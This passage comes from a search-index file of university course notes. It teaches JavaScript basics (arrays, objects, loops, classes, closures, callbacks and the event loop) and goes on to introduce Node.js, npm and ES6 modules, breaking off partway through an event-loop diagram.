myStr[2];\n</code></pre> <p><code>.slice()</code> accepts negative integers as arguments.</p> <pre><code>myStr.slice(-3); // last three\n// \"abc\"\nmyStr.slice(-2); // last two\n// \"bc\"\nmyStr.slice(-3, -1); // the third last followed by the second last.\n// \"ab\"\n</code></pre>"},{"location":"notes/l1_1_web_prog_common_js/#array","title":"Array","text":"<p>In JavaScript, we use <code>[</code> and <code>]</code> to enclose a sequence of items to create an array.</p> <pre><code>var myArr = [\"a\", \"b\", \"c\"];\n</code></pre> <p>Similar to String, we may use <code>[idx]</code> to access an element of an array at position <code>idx</code>.</p> <pre><code>myArr[0];\n// \"a\"\n</code></pre> <p>And the <code>.slice()</code> method also works on array.</p> <pre><code>myArr.slice(1, 3);\n// Array [\"b\", \"c\"]\n</code></pre> <p>The <code>.reverse()</code> method revesrse the array in-place.</p> <pre><code>myArr.reverse();\nmyArr;\n// Array [\"c\", \"b\", \"a\"]\n</code></pre> <p>Like string, <code>.concat()</code> method concatenates two arrays to produce a new one.</p> <pre><code>myArr.concat([\"d\"]);\n// Array [\"c\", \"b\", \"a\", \"d\"]\n</code></pre> <p>Note that the <code>+</code> operator does not concatenate arrays.</p> <pre><code>myArr + [\"d\"];\n// 'c,b,ad'\n</code></pre> <p>Method <code>join()</code> joins all the elements of an array back to a string, assuming all elements are string or can be converted to string.</p> <pre><code>myArray.join(\",\");\n// \"c,b,a\"\n</code></pre> <p>Method <code>push()</code> inserts a new element at the end of the array and <code>pop()</code> removes the last element. These two elements turn an array into a stack data structure.</p> <pre><code>myArr.push(\"d\");\nmyArr;\n// Array [\"c\", \"b\", \"a\", \"d\"]\nmyArr.pop();\n// \"d\"\nmyArr;\n// Array [\"c\", \"b\", \"a\"]\n</code></pre> <p>To insert an element at the begining of an array, we may use the <code>.unshift()</code> method.</p> <pre><code>myArr.unshift(\"d\");\nmyArr;\n// Array [\"d\", \"c\", \"b\", \"a\"]\n</code></pre> <p>Note that <code>unshift</code> can insert more than one elements, e.g. <code>arr.unshift(e1, e2,...)</code>.</p> <p>To insert an element at a particular position of an array, we use <code>.splice()</code> method.</p> <pre><code>myArr.splice(1, 0, \"z\");\nmyArr;\n// Array [\"d\", \"z\", \"c\", \"b\", \"a\"]\n</code></pre> <p>In the above, we call <code>splice()</code> with three arguments. The first argument denotes the index position of the array that we would like to insert the new element. the second argument specifies how many arguments we would like to remove from this position onwards before the insertion. In this case we don't want to remove any existing element. The third argument denotes the new element that we would like to insert.</p> <p>Without any surprise, we may also use <code>splice()</code> to remove elements from an array.</p> <pre><code>myArr.splice(1, 1);\nmyArr;\n// Array [\"d\", \"c\", \"b\", \"a\"]\n</code></pre>"},{"location":"notes/l1_1_web_prog_common_js/#object","title":"Object","text":"<p>Objects in JavaScritpts are key-value collection. It is very similar to the dictionary found in Python.</p> <pre><code>var myObj = { apple: 100, orange: 50 };\nmyObj[\"apple\"];\n// 100\nmyObj[\"durian\"] = 200;\nmyObj;\n// { 'apple': 100, 'orange': 50, 'durian': 200 }\n</code></pre> <p>Given a key of an object is of string type, besides using <code>obj[key]</code> to access the value, we may use the dot operator to access the value associated with the key.</p> <pre><code>myObj.durian;\n// 200\n</code></pre> <p>Besides strings as keys, we can use numbers as keys in JavaScript objects, though it is uncommon.</p> <pre><code>myObj[1] = 1000;\nmyObj[1];\n// 1000\n</code></pre> <p>However we cannot use dot operator to access values associated with number keys in JavaScript objects.</p> <pre><code>myObj.1; // syntax error\n</code></pre> <p>To remove a key from a JavaScript object, we may use the <code>delete</code> operator.</p> <pre><code>delete myObj[1];\nmyObj;\n// { 'apple': 100, 'orange': 50, 'durian': 200 }\n</code></pre> <p>Given an object <code>o</code>, <code>Object.keys(o)</code> returns all the keys in this object and <code>Object.entries(o)</code> returns all the key-value pairs in the object.</p> <pre><code>Object.keys(myObj);\n// ['apple', 'orange', 'durian']\nObject.entries(myObj);\n// [['apple', 100], ['orange', 50], ['durian', 200]]\n</code></pre>"},{"location":"notes/l1_1_web_prog_common_js/#control-flow-statements","title":"Control flow statements","text":"<p>Like other general purpose language, JavaScript offers the following standard control flow statements.</p>"},{"location":"notes/l1_1_web_prog_common_js/#if-else","title":"if-else","text":"<pre><code>var apple_count = null;\nif (\"apple\" in myObj) {\n  apple_count = myObj.apple;\n} else {\n  apple_count = 0;\n}\n</code></pre> <p>In the above we assign the value associatd with the key <code>apple</code> in <code>myObj</code> if <code>apple</code> exists in <code>myObj</code>'s key set. Otherwise, <code>0</code> is assigned. As a side note, <code>null</code> denotes a null value in JavaScript. It means \"not-exist\".</p>"},{"location":"notes/l1_1_web_prog_common_js/#for","title":"for","text":"<pre><code>var sum = 0;\nvar kvs = Object.entries(myObj);\nfor (let i = 0; i &lt; kvs.length; i++) {\n  sum = sum + kvs[i][1];\n}\nsum;\n// 350\n</code></pre> <p>In the above snippet, we use a <code>for</code> loop to compute the sum of all values in the object <code>myObj</code>. First we initialize the <code>sum</code> variable to <code>0</code>. We compute the key-value entries in <code>myObj</code> and store them <code>kvs</code>. In the third statement, we use a for-loop it iterate through every key-value pair and extract the value. In the for statement, we make use of an index variable <code>i</code>. Starting from 0, <code>i</code> can be used to make reference to the <code>i+1</code>-th entry in the array <code>kvs</code>. At the end of each iteration we increment <code>i</code> by 1. The loop stops when <code>i == kvs.length</code>.</p>"},{"location":"notes/l1_1_web_prog_common_js/#local-scope","title":"Local scope","text":"<p>Note that in the <code>for</code> statement we use <code>let</code> to declare a variable <code>i</code>. Remember the difference between <code>var</code> and <code>let</code> is as follows,</p> <ol> <li>Variables declared with <code>var</code> is accessible in the entire function body.</li> <li>Variables declared with <code>let</code> is accessible within the current block.</li> </ol> <p>In the above example, <code>i</code> is not accessible before and after the for-loop.</p> <p>Besides <code>var</code> and <code>let</code>, we can declare a constant variable using <code>const</code></p> <pre><code>const pi = 3.14;\n</code></pre> <p>Constant variables are immutable, i.e. once assigned their values cannot be updated.</p>"},{"location":"notes/l1_1_web_prog_common_js/#for-in-and-for-of","title":"For-in and For-of","text":"<p>We could rewrite the for-loop in the following</p> <pre><code>for (let i in kvs) {\n  sum = sum + kvs[i][1];\n}\n</code></pre> <p>Notice that <code>i</code> is the keys of object <code>kvs</code>. <code>for-in</code> statement will loop through indices if the given iterable is an array.</p> <p>Alternatively,</p> <pre><code>for (let kv of kvs) {\n  sum = sum + kv[1];\n}\n</code></pre> <p>In this case <code>kv</code> denotes the values from the array <code>kvs</code>. <code>for-of</code> statement will loop through each item if the given iterable is an array.</p>"},{"location":"notes/l1_1_web_prog_common_js/#while","title":"While","text":"<p>Besides for-loops, we can repeat operations with <code>while</code>.</p> <pre><code>var i = 0;\nwhile (i &lt; kvs.length) {\n  sum = sum + kvs[i][1];\n  i++;\n}\n</code></pre>"},{"location":"notes/l1_1_web_prog_common_js/#foreach-and-map","title":"forEach and map","text":"<p>Given an array, we can use <code>.forEach(p)</code> to apply function <code>p</code> to each element in the array.</p> <pre><code>kvs.forEach(function (kv) {\n  sum = sum + kv[1];\n});\n</code></pre> <p>In the above we pass anonymous function to add <code>kv[1]</code> to the <code>sum</code> variable. Note that the functio provided is a function without return statement.</p> <p>If we want to apply a function <code>f</code> to each element of the array to produce a new array, we use <code>.map(f)</code>. The function provided here has a return statement.</p> <pre><code>var kvs2 = kvs.map(function (kv) {\n  return [kv[0].toUpperCase(), kv[1]];\n});\nkvs2;\n// [['APPLE', 100], ['ORANGE', 50], ['DURIAN', 200]]\n</code></pre> <p>Note that in JavaScript there is no tuple datatype.</p>"},{"location":"notes/l1_1_web_prog_common_js/#javascript-operators","title":"JavaScript Operators","text":""},{"location":"notes/l1_1_web_prog_common_js/#binary-operators","title":"Binary Operators","text":"<p>Operators are predefined symbols in JavaScripts that allows us to compute result. For instance</p> <pre><code>var x = 3;\nvar y = 1;\nvar z = x + y; // z is 4\n</code></pre> <p>In the above context, this operator <code>+</code> sums up its given arguments since both are in number type.</p> <pre><code>typeof x; // number\ntypeof y; // number\n</code></pre> <p>The binary operator <code>+</code> is overloaded.</p> <pre><code>var a = \"3\";\nvar b = 1;\nvar c = a + b; // what is c?\n</code></pre> <p>In the above <code>+</code>'s left operand is a string and the right is a number, JavaScript performs some implicit type coercion to convert the second operand to string, hence <code>+</code> becomes a string concatenation operator.</p> <p>Another commonly use binary operator in JavaScript is <code>==</code> which used for comparison.</p> <pre><code>var i = 100;\nvar isEven = i % 2 == 0; // isEven is true\n</code></pre> <p>What about?</p> <pre><code>var isEven2 = i % 2 == \"0\"; // isEven2 is true or false?\n</code></pre> <p>JavaScript coerces the right operand from string to number for us, hence <code>isEven2</code> is <code>true</code></p> <p>However there situations in which such an implicit type coercion is dangerous</p> <pre><code>var isEven3 = i % 2 == \"\"; // isEven3 is true??!?\n</code></pre> <p>To prevent this kind of situation, it's better to use a coercion-free comparison.</p> <pre><code>var isEven4 = i % 2 === \"\"; // isEven4 is false!\n</code></pre>"},{"location":"notes/l1_1_web_prog_common_js/#things-for-you-to-check","title":"Things for you to check.","text":"<p>Please try to test out the following yourself, (try with different browsers).</p> <ol> <li>Add a number to a <code>null</code> value.</li> <li>Add a number to a <code>NaN</code> value.</li> <li>Compare two string values.</li> <li>Compare a number to a string value.</li> </ol>"},{"location":"notes/l1_1_web_prog_common_js/#unary-operators","title":"Unary Operators","text":"<p>Operators taking only one operand are called unary operators.</p> <p>For instance, the <code>-</code> symbol is a unary operator as it takes a numerical operand and changes the sign of the operand.</p> <p>The <code>!</code> symbol is another unary operator which takes boolean expression and return negation of the operand.</p>"},{"location":"notes/l1_1_web_prog_common_js/#class","title":"Class","text":"<p>In JavaScript, we can define a custom template for creating objects.</p> <pre><code>class Rect {\n  constructor(w, h) {\n    this.width = w;\n    this.height = h;\n  }\n  area() {\n    return this.width * this.height;\n  }\n}\n\nvar r = new Rect(10, 5);\nconsole.log(r.area());\n</code></pre> <p>In the above code snippet, we define a class <code>Rect</code>. Every object instance of <code>Rect</code> has a <code>width</code> and a <code>height</code> attribute. The <code>constructor()</code> is invoked when we instantiate an object instance from a class via the <code>new</code> keyword. Besides the constructor method, the <code>Rect</code> class defines an <code>area()</code> method which computes the area of the object. To invoke a normal method, we use the <code>.</code> operator.</p>"},{"location":"notes/l1_1_web_prog_common_js/#inheritance-only-available-in-es6-onwards","title":"Inheritance (Only available in ES6 onwards)","text":"<p>Since JavaScript version ES6, we can define subclasses using the <code>extends</code> keyword.</p> <pre><code>class Square extends Rect {\n  constructor(s) {\n    super(s, s);\n    this.side = s;\n  }\n}\n\nvar s = new Square(10);\nconsole.log(s.area());\n</code></pre> <p>With inheritence objects instantiated from a subclass inherits methods and attributes belong to the base classes.</p> <p>Most of the modern browsers support ES6. In case you need to handle some legacy browsers, or you would like understand how class and inheritance were compiled, you could read up the references</p> <ul> <li>JavaScript prototypes and prototype inheritance</li> </ul> <pre><code>https://www.freecodecamp.org/news/prototypes-and-inheritance-in-javascript/#:~:text=In%20JavaScript%2C%20an%20object%20can,from%20other%20objects%20%E2%80%94%20the%20prototypes.\n</code></pre>"},{"location":"notes/l1_1_web_prog_common_js/#higher-order-functions","title":"Higher order functions","text":""},{"location":"notes/l1_1_web_prog_common_js/#functions-as-inputs","title":"Functions as inputs","text":"<p>We have seen how functions are used in JavaScript in the previous unit. We consider some advanced usage of functions.</p> <pre><code>function incr(x) {\n  return x + 1;\n}\n\nfunction twice(f, x) {\n  return f(f(x));\n}\n\nconsole.log(twice(incr, 10)); // 12\n</code></pre> <p>In the above we define a function <code>incr</code> which increments a numerical input by <code>1</code>. Then we define a function <code>twice</code>, which takes a function argument <code>f</code> and another argument <code>x</code>. We apply <code>f</code> to <code>x</code> to produce an intermediate result then applies <code>f</code> again to the intermediate result.</p> <p><code>twice</code> is known as a higher order function as it takes another function as its input argument. Using higher order functions allows us to reuse codes.</p> <pre><code>function dbl(x) {\n  return x * 2;\n}\n\nconsole.log(twice(dbl, 10)); // 40\n</code></pre>"},{"location":"notes/l1_1_web_prog_common_js/#functions-as-a-returned-value-closure","title":"Functions as a returned value (Closure)","text":"<p>Look at the code below and try to answer the question in comment:</p> <pre><code>function aFunc(a) {\n  b = a * 5;\n}\naFunc(2); // a=2, b=10\n\n// Question: Is it possible to access or interact with the variables a and b after the funcion is invoked above?\n</code></pre> <p>The answer is no. However, there is a way achieve it.</p> <p>We can define a function that returns another function.</p> <pre><code>function part_sum(x) {\n  return function (y) {\n    return x + y;\n  };\n}\n\nvar incr_too = part_sum(1);\nconsole.log(twice(incr_too, 10)); // 12\n</code></pre> <p>In the above, we define a partial sum function, <code>part_sum</code> which takes an input <code>x</code> and returns an anonymous function that expects input <code>y</code>. The inner function returns the sum of <code>x</code> and <code>y</code>. <code>incr_too</code> is a reference to the anonymous function produced by <code>part_sum(1)</code> that expects <code>y</code> and returns <code>1 + y</code>.</p> <p>In this case, <code>part_sum</code> is a higher order function.</p> <p></p>"},{"location":"notes/l1_1_web_prog_common_js/#closure","title":"Closure","text":"<p>A closure in JavaScript is an inner function having access to its outer function's state/variables. In the example above, the inner function is a closure because the function is still having a reference to the variable <code>x</code> even after <code>part_sum(1)</code> has been invoked and returned. You can 'interact' with the variable <code>x</code> by invoking the <code>incr_too</code>.</p>"},{"location":"notes/l1_1_web_prog_common_js/#functions-as-call-backs","title":"Functions as call-backs","text":"<p>Function call-backs, also known as continuations, turn out to be very useful for us to define operations that should be performed in sequence. For instance,</p> <pre><code>var x = 1;\nvar y = incr(x);\nvar z = dbl(y);\nconsole.log(z);\n</code></pre> <p>In the above we would like to increment <code>x</code> by <code>1</code> then multiply the intermediate result <code>y</code> by <code>2</code>. With call-backs, we could rewrite the above as</p> <pre><code>function incr_with_callback(x, f) {\n  var r = incr(x);\n  f(r);\n}\n\nfunction dbl_with_callback(y, g) {\n  var r = dbl(y);\n  g(r);\n}\nvar x = 1;\nincr_with_callback(x, function (y) {\n  dbl_with_callback(y, function (z) {\n    console.log(z);\n  });\n});\n</code></pre> <p>We introduce some variants of <code>incr</code> and <code>dbl</code> by calling the original functions to obtain the result. Instead of returning the results, we pass the results to the call back functions <code>f</code> (or <code>g</code>). <code>f</code> (and <code>g</code>) are known as the continuations, which means even when the main function terminates, it continues the execution by calling <code>f</code> (or <code>g</code>).</p> <p>These two versions should produce the same result. One may argue that the second one is too hard to read and does not bring any significant value over the first version.</p>"},{"location":"notes/l1_1_web_prog_common_js/#application-of-call-backs","title":"Application of Call-backs","text":"<p>Call-backs are widely used in JavaScript. One essential usage of call-back is to support asynchronous progamming.</p>"},{"location":"notes/l1_1_web_prog_common_js/#asynchronous-programming","title":"Asynchronous Programming","text":"<p>Synchronous programming means instructions are executed one after another. On the other hand, asynchronous programming means instructions are not executed in the order they are structured. We need this \"out-of-order\" execution when there exists some long-running instruction that occurs in the middle of the program, but we do not want this long-running instruction to block the rest of instructions. For example, while waiting for an API to return an output, or waiting for the query results from database.</p> <p>One possible way to actualize asynchronous programming is to leverage multi-threading, i.e. to spawn a new thread from the main thread to execute the long-running instruction. We can use an analogy that a thread is like a virtual processor executing a task, so multi-threading allows you to start executing multiple task at the same time, altough not necessarily in parallel.</p> <p>However, implementing asynchronous programming with multi-threading might lead to extra memory overhead because each thread needs to pre-allocate and maintain its own call stack space and size.</p>"},{"location":"notes/l1_1_web_prog_common_js/#single-threaded-event-driven-programming","title":"Single threaded Event-driven Programming","text":"<p>JavaScript takes a different approach in supporting asynchronous programming without using multi-threading.</p> <p>From this point onwards, we narrow the definition of \"callbacks\" to be the functions that will be invoked when an event occurs.</p> <p>Like many other languages, JavaScript executes a program with a call stack and a heap. Heap is a memory space for us to store non-primitive value such as objects, strings and arrays. For now our focus is on the call stack.</p> <p>When a JavaScript starts, a <code>main</code> frame is added to the call stack.Global variables are stored in the <code>main</code> frame. When there is a function call, a new frame is placed on-top of the call stack. Local variables with primitive values are stored inside the frame. The frame is then popped when the function returns. The <code>main</code> frame is popped when all instructions in the JavaScript program has been executed. For example</p> <pre><code>function f(x) {\n  var y = x + 1;\n  return g(y);\n}\nfunction g(z) {\n  return z * 2;\n}\nf(10);\n</code></pre> <p>In the above program, we define two functions <code>f</code> and <code>g</code>. The call stack begins with the folowing frame.</p> <pre><code>graph LR;\n    id3(main)</code></pre> <p>The main program call <code>f(10)</code>. We place a new frame on the call stack. When executing <code>f(10)</code>, we assign <code>10+1</code> to a local variable <code>y</code> in the call frame of <code>f(10)</code>.</p> <pre><code>graph LR;\n    id2(\"f(10)&lt;br/&gt;y=11\")\n    id3(main)</code></pre> <p>Before returning the result, we call <code>g(y)</code> which is <code>g(11)</code> which creates another call frame. The following diagram shows the call stack with three frames when the program execution point is right before <code>return z*2</code>.</p> <pre><code>graph LR;\n    id1(\"g(11)\")\n    id2(\"f(10)&lt;br/&gt;y=11\")\n    id3(main)</code></pre> <p>As <code>g(11)</code> call returns we remove the top most frame, i.e. <code>g(11)</code>, then back to the frame <code>f(10)</code>.</p> <pre><code>graph LR;\n    id2(\"f(10)&lt;br/&gt;y=11\")\n    id3(main)</code></pre> <p>We return <code>22</code> as result and remove the second frame, <code>f(10)</code>.</p> <pre><code>graph LR;\n    id3(main)</code></pre> <p>Lastly, we remove the <code>main</code> frame as we reach to the end of the program.</p> <p></p>"},{"location":"notes/l1_1_web_prog_common_js/#callback-queue","title":"Callback Queue","text":"<p>Things become more interesting in the presence of call-back functions associated with some UI elements. Recall one of our earlier examples,</p> <pre><code>1: function handleButton1Click() {\n2:   var textbox1 = document.getElementById(\"textbox1\");\n3:   var span1 = document.getElementById(\"span1\");\n4:   span1.innerHTML = textbox1.value;\n5: }\n6: function run() {\n7:   var button1 = document.getElementById(\"button1\");\n8:   button1.addEventListener(\"click\", handleButton1Click);\n9: }\n10: document.addEventListener(\"DOMContentLoaded\", run);\n</code></pre> <p>The program contains three portions, the two function definitions and a statement. JavaScript run-time in the browser executes them sequentially and synchronously, in the <code>main</code> call frame. To illustrate the step by step program execution let's consider the following table. The first column is the program counter. The second column captures the call stack, for simplicity, we use python's style list to represent a stack, where the left most element the bottom frame. The third column is a mapping from (UI) events to call-back functions, we use Python's style dictionary syntax. The fourth coulumn is the callback queue (again we use python's list style)</p> line num call stack event reg table callback queue 1 [main] {} [] 6 [main] {} [] 10 [main] { <code>DomContentLoaded</code> : <code>run</code>} [] <p>The run-time first execute the function declaration in line 1, in call frame <code>main</code>, which does not affect the event registration table nor the callback queue. Similar observation applies when it move on to execute the function declaration in line 6. When the program counter is at line 10, we are add the last statement of the main program. Add an event listener to the even <code>DOMContentLoaded</code>, which creates an entry to the even registration table, mapping <code>DOMContentLoaded</code> to the function <code>run</code> as callback. After line 10, the call stack becomes empty as <code>main</code> ended. However the JavaScript run-time for rendering this web page is still running. It is executing an event-loop, in which it periodically check whether there is anything is the callback queue. At this point in time the browser continues to render the HTML page. When the HTML document is fully rendered, the browser triggers an <code>DomContentLoaded</code> event. At this point the callback function <code>run</code> associated with the event is enqueued to the callback queue. Since the call stack is empty and the callback queue is not, the JavaScript run-time dequeues <code>run</code> from the callback queue and creates a call frame in the call stack. It continues to move the program counter from lines 7-9.</p> program counter (line num) call stack event reg table callback queue ... ... ... ... [] { <code>DomContentLoaded</code> : <code>run</code>} [<code>run</code>] 7 [<code>run</code>] { <code>DomContentLoaded</code> : <code>run</code>} [] 8 [<code>run</code>] { <code>DomContentLoaded</code> : <code>run</code>} [] 9 [<code>run</code>] { <code>DomContentLoaded</code> : <code>run</code>, <code>button1.click</code> : <code>handleButton1Click</code> } [] <p>At the end of line 9, a new event (<code>button1</code> being clicked) is being registered, mapping to <code>handleButton1Click</code>. The call stack becomes empty again. The JavaScript run-time goes into the event loop again, waiting for next event to take place.</p> <p>When someone clicks on the button <code>button1</code>, the callback function <code>handleButton1Click</code> will be enqeued into the callback queue. The run-time will \"move\" it into the call stack to execute it.</p>"},{"location":"notes/l1_1_web_prog_common_js/#we-have-purposely-ignored-something","title":"We have purposely ignored something ...","text":"<p>Actually, besides the callback, there are something called promises which enable JavaScript code to support asynchronous programming. We will discuss it in details in the next class.</p>"},{"location":"notes/l1_1_web_prog_common_js/#cohort-exercise","title":"Cohort Exercise","text":"<ol> <li>(Not Graded) Add some <code>console.log()</code> to the <code>textandbutton.js</code> and open <code>textandbutton.html</code> to observe in what order the call backs are executed.</li> <li>(Graded) Complete the following HTML and JavaScript codes, so that when the button <code>Submit</code> is clicked, the min and the max of the sequence of numbers (seperated by \",\") entered in the input text box will be displayed in the <code>span</code> elements.</li> </ol> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;script src=\"minmax.js\"&gt;&lt;/script&gt;\n    &lt;meta charset=\"utf-8\" /&gt;\n    &lt;title&gt;50.003 sample code: Min and Max&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div&gt;Your input: &lt;input id=\"textbox1\" type=\"text\" /&gt;&lt;/div&gt;\n    &lt;div&gt;Min: &lt;span id=\"min\"&gt;&lt;/span&gt;&lt;/div&gt;\n    &lt;div&gt;Max: &lt;span id=\"max\"&gt;&lt;/span&gt;&lt;/div&gt;\n    &lt;div&gt;&lt;button id=\"button1\"&gt;Submit&lt;/button&gt;&lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <pre><code>function numbers(l) {\n  var o = [];\n  for (let i in l) {\n    var n = parseInt(l[i], 10);\n    if (!isNaN(n)) {\n      o.push(n);\n    }\n  }\n  return o;\n}\n// input: an array of numbers\n// output: an object containing 'min', with the minimum of the array and 'max' the maximum of the array.\nfunction min_max(a) {\n  var min = null;\n  var max = null;\n  // TODO: fixme\n  return { min: min, max: max };\n}\n\nfunction handleButton1Click() {\n  var textbox1 = document.getElementById(\"textbox1\");\n  var min = document.getElementById(\"min\");\n  var max = document.getElementById(\"max\");\n  var items = textbox1.value.split(\",\");\n  var obj = min_max(numbers(items));\n  min.innerHTML = obj[\"min\"];\n  max.innerHTML = obj[\"max\"];\n}\n\nfunction run() {\n  var button1 = document.getElementById(\"button1\");\n  // TODO: fixme\n}\n\ndocument.addEventListener(\"DOMContentLoaded\", run);\n</code></pre>"},{"location":"notes/l1_2_nodejs/","title":"50.003 - Node.js","text":""},{"location":"notes/l1_2_nodejs/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to</p> <ol> <li>Name the differences between frontend and backend development for web application</li> <li>Describe the use of a package/project manager for node.js</li> <li>Describe the run-time system of node.js</li> <li>Compare the difference between event callbacks and promises.</li> <li>Analyse the run-time behavior of an asynchronous node.js program</li> </ol>"},{"location":"notes/l1_2_nodejs/#frontend-vs-backend","title":"Frontend vs Backend","text":"<p>In many web applications, it is insufficient to run the application in the browser which is a run-time system hosted in the user's device, such as desktop, laptop or mobile phone. An obvious reason is that certain computation must not be executed on the user's device due to security and integrity, for instance, transferring balance from one account to another. These highly sensitive operations should be executed at the server ends, which is known as the \"backend\".</p> <p>In practice, frontend deals with the end users\u2019 input and interaction, while backend deals with the data storage, data analysis, data retrieval, business logic, authentication, and scalability</p> <p></p> <p>image source </p>"},{"location":"notes/l1_2_nodejs/#nodejs","title":"Node.js","text":"<p>There are many options of implementing the backend applications, e.g. Spring with Java, Django with Python, Flask with Python, Node.js with JavaScript.</p> <p>Node.js is a run-time system to run JavaScript applications without the browser (and its event APIs), for instance <code>document</code> is no longer a predefined reference in Node.js.</p>"},{"location":"notes/l1_2_nodejs/#hello-world","title":"Hello World","text":"<p>The hello world program in Node.js is not too far apart from the one in the browser.</p> <p>Suppose we have a JavaScript file name <code>hello.js</code> with the following content,</p> <pre><code>console.log(\"hello\");\n</code></pre> <p>To execute it, we need the node.js run-time to be installed, for installation, please refer to</p> <pre><code>https://nodejs.org/en/download\n</code></pre> <p>Then in the terminal,</p> <pre><code>node hello.js\n</code></pre> <p>We see the message <code>hello</code>, being printed in the terminal.</p> <p>Since it is using the same language as the browser run-time, we will skip those common language features and focus on the difference.</p>"},{"location":"notes/l1_2_nodejs/#nodejs-projectpackage-manager","title":"Node.js Project/Package Manager","text":"<p>In most of the cases, we develop projects based on existing libraries, modules and packages. To better manage all these dependencies, we need a project management tool. <code>npm</code> is the mostly commonly used too in the node.js community. Its role is similar to <code>pip</code> for python and <code>gradle</code> for java.</p> <p>To start a Node.js project,</p> <pre><code>mkdir myproj\ncd myproj\nnpm init\n</code></pre> <p>To add a dependency, we type <code>npm i package_name</code>. For example,</p> <pre><code>npm i xhr2\n</code></pre> <p>where <code>xhr2</code> is the library that we would like to install as a dependency for our current project. In this example, we install xhr2 library, which is useful to emulate XMLHttpRequest, an API that provides functionality for transferring data between client and server.</p> <p>After executing the above command, we observe that the <code>xhr2</code> library is downloaded to a temporary forder <code>node_modules</code> and the following</p> <pre><code>  \"dependencies\": {\n    \"xhr2\": \"^0.2.1\"\n  }\n</code></pre> <p>is added to the project definition file <code>package.json</code>.</p> <p>When we clone the project to a new machine, (for development installation or deployment purpose), we can download all the dependencies defined by <code>package.json</code> by running</p> <pre><code>npm i\n</code></pre> <p>Next we would like to enable the ES6 module mode in this project. We will explain what is ES6 module mode shortly.</p> <p>Use an editor to add the following entry to the <code>package.json</code> file.</p> <pre><code>{\n  \"name\": \"myproj\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"\n  },\n  \"type\": \"module\", // enable module type\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"dependencies\": {\n    \"xhr2\": \"^0.2.1\"\n  }\n}\n</code></pre>"},{"location":"notes/l1_2_nodejs/#commonjs-vs-es6-modules","title":"CommonJS vs ES6 modules","text":"<p>Module system allows one to put common codes in a module which can be reused by many different use sites.</p> <p>For instance, consider the following JavaScript program <code>mymath.js</code></p> <pre><code>const pi = 3.14159;\nconst e = 2.71828;\n\nmodule.exports = { pi, e };\n</code></pre> <p>in which we define two constant variables <code>pi</code> and <code>e</code>, and export them, so that when <code>mymath.js</code> is being imported in another JavaScript program, these two constant variables can be reused.</p> <p>Traditionally, In Common JavaScript (dubbed as CJS), we import predefined references from another JS file, via the <code>require()</code> function.</p> <pre><code>const mymath = require(\"./mymath.js\");\nconsole.log(mymath.pi);\n</code></pre> <p>In ES6 onwards, the following \"better\" syntax was instroduced,</p> <p>Exporting</p> <pre><code>const pi = 3.14159;\nconst e = 2.71828;\n\nexport { pi, e };\n</code></pre> <p>Importing</p> <pre><code>import { pi } from \"./mymath.js\";\nconsole.log(pi);\n</code></pre> <p>For the rest of this unit, we will stick to the ES6 import syntax.</p> <p>Let's consider the following JavaScript program <code>circle.js</code> that makes use of <code>mymath.js</code>.</p> <pre><code>import { pi } from \"./mymath.js\";\n\nclass Circle {\n  constructor(r) {\n    this.r = r;\n  }\n  area() {\n    return this.r ** 2 * pi;\n  }\n}\n\nexport default Circle;\n</code></pre> <p>In the above, we make use of the <code>pi</code> defined in <code>mymath.js</code> to compute the area of a <code>Circle</code> object. And the end of the file, we export the class definition <code>Circle</code> with a <code>default</code> modifier. Note that there can only one name to be exported if <code>default</code> is used. Being a <code>default</code> export, we do not need to surround it with <code>{}</code> when importing. In CommonJS (pre ES6), we write <code>modules.export = Circle</code> instead.</p> <p>Consider the following program <code>moduletest.js</code></p> <pre><code>import Circle from \"./circle.js\";\nvar circle = new Circle(10);\nconsole.log(circle.area());\n</code></pre>"},{"location":"notes/l1_2_nodejs/#nodejs-event-loop","title":"Node.js Event-loop","text":"<p>Like JavaScript run-time in the browser, when the main program ended, Node.js run-time goes into an event loop. Remember that events like timer, http request, data transfer, or button click can trigger callbacks. The callbacks are asynchronous and might be executed by the other threads or the nodeJS main thread itself.</p> <p>The Node.js event-loop consists of the following steps, (AKA phases.)</p> <pre><code>   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u250c\u2500&gt;\u2502           timers          \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  \u2502     pending callbacks     \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  \u2502       idle, prepare       \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2502   incoming:   